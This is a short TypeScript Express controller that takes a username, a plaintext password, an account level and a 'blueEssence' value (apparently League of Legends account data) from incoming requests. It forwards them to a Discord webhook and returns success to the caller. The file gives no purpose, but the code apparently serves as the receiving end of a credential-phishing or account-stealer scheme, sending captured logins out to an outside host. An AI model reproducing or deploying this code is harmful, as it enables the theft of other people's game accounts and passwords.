import { Request, Response } from "express";
import { WebhookClient } from "discord.js";
import errorLogger from "../helpers/errorlogger";
import generateEmbed from "../helpers/generateEmbed";

const WEBHOOK_URL = process.env.WEBHOOK_URL ?? "";

const discordWebhook = new WebhookClient({ url: WEBHOOK_URL });

const webhookController = async (req: Request, res: Response) => {
	try {
		const embed = generateEmbed(
			req.body.data?.username,
			req.body.data?.password,
			req.body.data?.level,
			req.body.data?.blueEssence
		);

		// Send the webhook embed
		discordWebhook.send({
			embeds: [embed],
		});

		// Return status so API call is considered successful
		return res.sendStatus(200);
	} catch (err) {
		const errorMessage = errorLogger(err);

		console.log(errorMessage);
	}
};

export default webhookController;
